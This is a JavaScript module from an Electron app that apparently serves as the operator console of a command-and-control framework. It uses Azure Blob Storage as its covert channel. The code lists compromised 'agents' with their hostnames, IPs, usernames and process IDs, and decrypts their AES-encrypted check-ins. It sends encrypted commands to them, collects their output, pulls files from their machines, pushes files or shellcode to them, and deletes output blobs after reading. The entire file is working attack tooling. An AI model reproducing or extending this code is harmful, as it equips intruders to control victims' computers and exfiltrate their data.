const { ipcMain} = require('electron');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs'); 
const fsp = require('fs').promises;
const { log } = require('console');
const { getAppDataDir } = require('./common');
const directories       = getAppDataDir();

class Agent {
  constructor() {
      this.agentid = '';
      this.arch = '';
      this.container = '';
      this.hostname = '';
      this.IP = [];
      this.osRelease = '';
      this.osType = '';
      this.PID = null;
      this.platform = '';
      this.Process = '';
      this.username = '';
      this.checkin = Date.now();
      this.tasks = [];
      this.aes = {
          'key': null,
          'iv': null
      }; 
      this.blobs = {
          'checkin': null,
          'in': null
      };
  }
}

function decodeBase64(base64) {
  const buffer = Buffer.from(base64, 'base64');
  return buffer.toString('utf-8');
}
function encodeBase64(input) {
  const buffer = Buffer.from(input, 'utf-8');
  return buffer.toString('base64');
}
async function aesEncrypt(data, key, iv) {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

  let encrypted = "";
  if (Buffer.isBuffer(data)) {
    encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  }
  else {
    encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
  }
  return encrypted;
}
async function aesDecrypt(encryptedData, key, iv) {
  // const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  // let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
  // decrypted += decipher.final('utf8');
  // return decrypted;
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  
  let decrypted = "";
  if ( Buffer.isBuffer( encryptedData ) ) {
    decrypted = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
  }
  else { 
    decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
  }
  return decrypted;
}
async function DeleteStorageContainer(StorageContainer)
{
    let options = {
      hostname: global.config.storageAccount,
      port: 443,
      path: `/${StorageContainer}?restype=container&${global.config.sasToken}`,
      method: 'DELETE',
      headers: {
        'x-ms-version': '2020-04-08', 
        'x-ms-date': new Date().toUTCString() 
      }
    };
    return await makeRequest(options);
}
async function DeleteStorageBlob(StorageContainer,StorageBlob)
{
    let options = {
      hostname: global.config.storageAccount,
      port: 443,
      path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`,
      method: 'DELETE',
      headers: {
        'x-ms-version': '2020-04-08'
      }
    };
    return await makeRequest(options);
}
async function preloadContainers()
{
    let meta_agent_container_info = [];
    log(`azure.js | preloadContainers() | storageAccount=${global.config.storageAccount}, metaContainer=${global.config.metaContainer}`);
    try {
          let i = 1;
          let options = {
            hostname: global.config.storageAccount,
            port: 443,
            path: `/${global.config.metaContainer}?restype=container&comp=list&${global.config.sasToken}`,
            method: 'GET',
            headers: {
              'x-ms-version': '2020-04-08'
            }
          };
          let response = await makeRequest(options);
          if (response.status === 404){
            log(`azure.js | preloadContainers() | ${response.status} | [!] Container ${global.config.metaContainer} not found. Sleeping for 5 seconds and trying again.`);
            await new Promise(resolve => setTimeout(resolve, 5000)); 
            return null;
          }
          let blobs = response.data.match(/<Name>([^<]+)<\/Name>/g).map(b => b.replace(/<\/?Name>/g, ''));
          for (const blob of blobs) {
              try
              {
                let agent_container = await readBlob(global.config.metaContainer,blob);
                if(agent_container.status === 200)
                {
                  let this_agent_info = {
                    'agentid':blob,
                    'containerid':agent_container['data']
                  }
                    meta_agent_container_info.push(this_agent_info);
                }
              }catch(error)
              {
                console.log(`Failed to get agent container ${error.stack}`);
              }
          }
          return JSON.stringify(meta_agent_container_info);
      } catch (error) {
          log(`azure.js | preloadContainers() | Error listing blobs in container ${global.config.metaContainer}:`, error.message, error.stack);
          return null;
      }
}

async function updateDashboardTable()
{
    let agentcheckins = [];
    try {
        let thisAgent = null;
        let agentObj  = null;
        let MetaBlobs = await list_blobs(global.config.metaContainer);
        for (const agentMetaBlob of MetaBlobs) 
        {
            try
            {
              if(global.agents.find(agent => agent.agentid === agentMetaBlob)){
                thisAgent = global.agents.find(agent => agent.agentid === agentMetaBlob);
              }
              else{
                thisAgent = new Agent();
                thisAgent.agentid = agentMetaBlob;
                const [aesKeys, links] = await getContainerAesKeys(thisAgent.agentid);
                thisAgent.aes = aesKeys;
                thisAgent.links = links;
                if(thisAgent.aes == null){ continue; }
                let metaAgentResponse = await readBlob(global.config.metaContainer,agentMetaBlob);
                if(metaAgentResponse.status != 200 || metaAgentResponse.response.data == null){ continue; }
                thisAgent.container = metaAgentResponse.data;
                thisAgent.blobs = await getContainerBlobs(thisAgent.container);
                if(thisAgent.blobs == null ){ continue; }
                let checkinData    = await checkinContainer(thisAgent.container, thisAgent.aes, thisAgent.blobs);
                if(checkinData == null){ continue; }
                try {
                    if (typeof checkinData === 'string') { agentObj = JSON.parse(checkinData); } else { continue; }
                } catch (error) { continue; }
                log(`agentObj : ${JSON.stringify(agentObj)}`);
                thisAgent.hostname = agentObj.hostname;
                thisAgent.IP = agentObj.IP;
                thisAgent.osRelease = agentObj.osRelease;
                thisAgent.osType = agentObj.osType;
                thisAgent.PID = agentObj.PID;
                thisAgent.platform = agentObj.platform;
                thisAgent.Process = agentObj.Process;
                thisAgent.username = agentObj.username;
                thisAgent.arch = agentObj.arch;
                thisAgent.mode = agentObj.mode;
                if (global.haltUpdate == false) { global.agents.push(thisAgent); }
              }  
              let checkinBlobLastModified = await getBlobLastModified(global.config.metaContainer,agentMetaBlob);
              const timestamp = new Date(checkinBlobLastModified).getTime(); 
              if(!timestamp){
                return 0;
              }
              thisAgent.checkin = timestamp;
              agentcheckins.push(thisAgent); 
            }catch(error)
            {
                log(`Failed to get checkin from listed agent container ${error.stack}`);
                return 0;
            }
        }
        return JSON.stringify(agentcheckins);
    } catch (error) {
        console.error(`Error listing blobs in container: \r\n\t${error.message} \r\n\t${error.stack}\n ${JSON.stringify(agentcheckins)}`);
        return 0;
    }
}
async function list_blobs(containerName)
{
  try{
    let options = {
      hostname: global.config.storageAccount,
      port: 443,
      path: `/${containerName}?restype=container&comp=list&${global.config.sasToken}`,
      method: 'GET',
      headers: {
        'x-ms-version': '2020-04-08'
      }
    };
    let response = await makeRequest(options);
    let blobs = response.data.match(/<Name>([^<]+)<\/Name>/g).map(b => b.replace(/<\/?Name>/g, ''));
    return blobs;
  } catch (error) {
    //console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}`);
    return [];
  }
}
async function getBlobLastModified(containerName,blob)
{
  let options = {
    hostname: global.config.storageAccount,
    port: 443,
    path: `/${containerName}/${blob}?${global.config.sasToken}`,
    method: 'HEAD',
    headers: {
      'x-ms-version': '2020-04-08'
    }
  };
  let response = await makeRequest(options);
  const lastModified = response.response.headers["last-modified"];
  return lastModified;
}
async function returnAgentCheckinInfo(agentid)
{
  try{
      let checkinBlobLastModified = await getBlobLastModified(global.config.metaContainer,agentid);
      return new Date(checkinBlobLastModified).getTime();  
    } catch (error) {
        console.error(`returnAgentCheckinInfo() | Error :`, error.message, error.stack);
        return 0;
    }
}

async function makeRequest(options, data = null) {
  // Wait for renderer to be ready
  if (!global.dashboardWindow.webContents.isLoading()) {
  } else {
      await new Promise(resolve => {
          global.dashboardWindow.webContents.once('did-finish-load', resolve);
      });
  }

  return new Promise((resolve, reject) => {
      const url = `https://${options.hostname}:${options.port}${options.path}`;
      const requestId = Date.now().toString();
      // Set up response handler before sending request
      const responseHandler = (event, response) => {
          if (response.error) {
              log(`[WEB-REQUEST] Error: ${response.error}`);
              reject(new Error(response.error));
              return;
          }
          resolve({
              response: response,
              status: response.status,
              data: response.data
          });
      };
      // Listen for the response with timeout
      ipcMain.once(`web-request-response-${requestId}`, responseHandler);
      if (data) {
          if (!options.headers) {
              options.headers = {};
          }
          options.headers['Content-Length'] = Buffer.byteLength(data);
      }
      // Send request to renderer
      try {
          global.dashboardWindow.webContents.send('make-web-request', {
              url,
              method: options.method,
              headers: options.headers,
              body: data,
              requestId
          });
      } catch (err) {
          ipcMain.removeListener(`web-request-response-${requestId}`, responseHandler);
          reject(err);
      }
      let timeout = 300000;
      setTimeout(() => {
          ipcMain.removeListener(`web-request-response-${requestId}`, responseHandler);
          reject(new Error(`Web request timed out after ${timeout}ms`));
      }, timeout);
  });
}
async function UploadBlobToContainer(StorageContainer,StorageBlob,data)
{

    if ( data == null)
    {
      data = "";
    }
    const options = {
        hostname: global.config.storageAccount,
        port: 443,
        path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`, 
        method: 'PUT',
        headers: {
          'x-ms-version': '2020-02-10', 
          'x-ms-date': new Date().toUTCString(),
          'x-ms-blob-type': 'BlockBlob',
          'Content-Type': 'text/plain', 
          'Content-Length': Buffer.byteLength(data) 
        }
    };
    return makeRequest(options,data);
}
async function readBlob(StorageContainer, StorageBlob) {
  try {
      const options = {
          hostname: global.config.storageAccount,
          port: 443,
          path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`,
          method: 'GET',
          headers: {
              'x-ms-version': '2020-02-10',
              'x-ms-date': new Date().toUTCString()
          }
      };
      const response = await makeRequest(options);
      if (!response || response.length === 0 || response.status === 404) {
          throw new Error(`Blob read failed: Empty response from ${StorageBlob}`);
      }
      return response; 
  } catch (error) {
      console.error(`Error reading blob ${StorageBlob}:`, error.message);
      return null; 
  }
}
async function getContainerBlobs(containerName)
{
    let inputBlob  = "";
    let checkinBlob = "";
    try {

        let agent_blobs = await list_blobs(containerName);
        if(agent_blobs == null){
          return false;
        }
        for (const blob of agent_blobs)
        {
            if (blob.startsWith('i-')) {
                inputBlob = blob;
            }
            if (blob.startsWith('c-')) {
                checkinBlob = blob;
            }
        } 
        const blobs = {
            'checkin' : checkinBlob,
            'in'      : inputBlob,
        };
        return blobs;
    } catch (error) {
        return false;
    }
}

async function getContainerAesKeys(agentid)
{
  try {
      const options = {
          hostname: global.config.storageAccount,
          port: 443,
          path: `/${global.config.metaContainer}/${agentid}?comp=metadata&${global.config.sasToken}`,
          method: 'GET',
          headers: {
              'x-ms-version': '2022-11-02',
              'x-ms-date': new Date().toUTCString()
          }
      };
      const response = await makeRequest(options);
      if(response.response.headers["x-ms-meta-signature"] == null || response.response.headers["x-ms-meta-hash"] == null){
        return null;
      }
      let aes_key = decodeBase64(response.response.headers["x-ms-meta-signature"]);
      let aes_iv  = decodeBase64(response.response.headers["x-ms-meta-hash"]);
      let key = {
        'key':JSON.parse(aes_key),
        'iv': JSON.parse(aes_iv)
      }
      const links = response.response.headers["x-ms-meta-link"];
      return [key,links];
  } catch (error) {
      console.error(`[AESKEYS][!] Error getting aes keys for agent ${agentid}:`, error.message, error.stack);
      return null; 
  }
}

async function checkinContainer(containerName, aes, blobs)
{
    try {
        //log(`checkinContainer() | containerName : ${containerName}`);
        //log(`checkinContainer() | aes : ${JSON.stringify(aes)}`);
        const aes_key_bytes = Buffer.from(aes['key'], 'hex');
        const aes_iv_bytes  = Buffer.from(aes['iv'],  'hex'); 
        let checkin         = await readBlob(containerName, blobs['checkin']);
        let enc_checkin     = decodeBase64(checkin.data);
        const dec_checkin   = await aesDecrypt(enc_checkin,aes_key_bytes,aes_iv_bytes);
        if (!dec_checkin) {
            console.error('No checkin blob content found.');
            return;
        }else
        {
            return dec_checkin;
        }
    } catch (error) {
        //console.error(`Error connecting to container ${containerName}:`, error.message);
        return null;
    }
}

async function clearBlob(StorageContainer, StorageBlob) 
{
  const options = {
    hostname: global.config.storageAccount,
    port: 443,
    path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`,
    method: 'PUT',
    headers: {
      'x-ms-version': '2020-02-10',
      'x-ms-date': new Date().toUTCString(),
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'text/plain',
      'Content-Length': 0 
    }
  };
  return makeRequest(options);
}

async function uploadCommand(agent_object)
{
    const task = agent_object.tasks[agent_object.tasks.length - 1];
    const key = Buffer.from(agent_object.aes['key']);
    const iv = Buffer.from(agent_object.aes['iv']);

    // Read the blob first to check if it's empty
    let blobCheck = await readBlob(agent_object.container, agent_object.blobs['in']);
    if (blobCheck.status === 200) {
        if (!blobCheck.data || blobCheck.data.length === 0) {
            // Blob exists but is empty, proceed with upload
            const encryptedData = await aesEncrypt(JSON.stringify(task), key, iv);
            const b64EncData = encodeBase64(encryptedData);
            let response = await UploadBlobToContainer(agent_object.container, agent_object.blobs['in'], b64EncData);
            
            if (response.status != 201) {
                log(`azure.js | uploadCommand() | ${response.status} | [!] Failed to upload command to container ${agent_object.container}`);
                return null;
            }

            let decrypted_out_data;
            const startTime = Date.now();
            let currentTime;
            let elapsed;

            while(true) {
                let command_output = await readBlob(agent_object.container, task.outputChannel);
                if (command_output === null) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    continue;
                }
                if (command_output['data']) {
                    let encrypted_out_data = decodeBase64(command_output['data']);
                    decrypted_out_data = await aesDecrypt(encrypted_out_data, key, iv);
                    await clearBlob(agent_object.container, task.outputChannel);
                    await DeleteStorageBlob(agent_object.container, task.outputChannel);
                    break;
                }
                currentTime = Date.now();
                elapsed = (currentTime - startTime)/1000;
                let waittime = 1200;
                if (elapsed > waittime) {
                    decrypted_out_data = `[!] No response for ${task.taskId} after ${waittime} seconds to output channel ${task.outputChannel}\r\n${task.command}`;
                    break;
                }
            }
            return decrypted_out_data;
        }
    }
    return false;
}

async function pullDownloadFile(agent_object,filename,blob)
{
  try{
    log(`azure.js | pullDownloadFile()`);
    const key  = Buffer.from(agent_object.aes['key']);
    const iv   = Buffer.from(agent_object.aes['iv']);
    let baseFileName = path.basename(filename);
    log(`pullDownloadFile() | filename     : ${filename}`);
    log(`pullDownloadFile() | blob         : ${blob}`);
    let raw;
    if (!fs.existsSync(directories.downloadsDir)) {
        fs.mkdirSync(directories.downloadsDir, { recursive: true });
    }
    const destPath = path.join(directories.downloadsDir, baseFileName);
    const url  = `https://${global.config.storageAccount}/${agent_object.container}/${blob}?${global.config.sasToken}`;
    log(`pullDownloadFile() | URL : ${url}`);
    let buffer;
    let index = 1;
    while(true)
    {
        let response = await fetch(url);
        
        if (!response.ok) {
          log(`pullDownloadFile loop : ${index} | Failed to download file. Sleeping for 3 seconds and trying again. Status: ${response.status} ${response.statusText}`);
          await new Promise(resolve => setTimeout(resolve, 3000));
        }else
        {
          let arrayBuffer = await response.arrayBuffer();
          buffer = Buffer.from(arrayBuffer);
          break;
        }
        index +=1;
    }
    raw  = await aesDecrypt( buffer, key, iv );
    await fsp.writeFile(destPath, raw, (err) => {
      log(`Error writing file: ${err.stack}`);
    });
    log(`File ${destPath} has been saved.`);
    }catch(error)
    {
      log(`pullDownloadFile() Error: ${error} ${error.stack}`);
    }
}

async function uploadSCToAzure(agent_object, StorageBlob, filePath)
{
    try {
      log(`[AZURE][UPLOAD] uploadSCToAzure() | agent_object : ${JSON.stringify(agent_object)}`);
      log(`[AZURE][UPLOAD] uploadSCToAzure() | StorageBlob : ${StorageBlob}`);
      log(`[AZURE][UPLOAD] uploadSCToAzure() | filePath : ${filePath}`);
      const key  = Buffer.from(agent_object.aes['key']);
      const iv   = Buffer.from(agent_object.aes['iv']);

      const fileContent = await fsp.readFile(filePath);
      const enc         = await aesEncrypt( fileContent, key, iv );
      const sasUrl = `https://${global.config.storageAccount}/${agent_object.container}/${StorageBlob}?${global.config.sasToken}`;
      const response = await fetch(sasUrl, {
        port: 443,
        method: 'PUT',
        headers: {
          'x-ms-blob-type': 'BlockBlob',
          'Content-Type': 'application/octet-stream' 
        },
        body: enc
      });
      log(`[AZURE][UPLOAD] response ${response.ok}`);
    } catch (error) {
      log(`[AZURE][UPLOAD] Error uploading file to azure : ${error.stack}`);
    }
}

async function uploadFileToAzure(agent_object, StorageBlob, filePath)
{
    try {
      const key  = Buffer.from(agent_object.aes['key']);
      const iv   = Buffer.from(agent_object.aes['iv']);
      const fileContent = await fsp.readFile(filePath);
      const enc         = await aesEncrypt( fileContent, key, iv );
      const sasUrl = `https://${global.config.storageAccount}/${agent_object.container}/${StorageBlob}?${global.config.sasToken}`;
      const response = await fetch(sasUrl, {
        port: 443,
        method: 'PUT',
        headers: {
          'x-ms-blob-type': 'BlockBlob',
          'Content-Type': 'application/octet-stream' 
        },
        body: enc
      });
    } catch (error) {
      log(`azure.js | uploadFileToAzure()\r\nError uploading file to azure : ${error.stack}`);
    }
}
module.exports = {
    getContainerBlobs,
    preloadContainers,
    UploadBlobToContainer,
    readBlob,
    updateDashboardTable,
    checkinContainer,
    getContainerAesKeys,
    uploadCommand,
    returnAgentCheckinInfo,
    uploadFileToAzure,
    uploadSCToAzure,
    pullDownloadFile,
    DeleteStorageContainer,
    DeleteStorageBlob
};
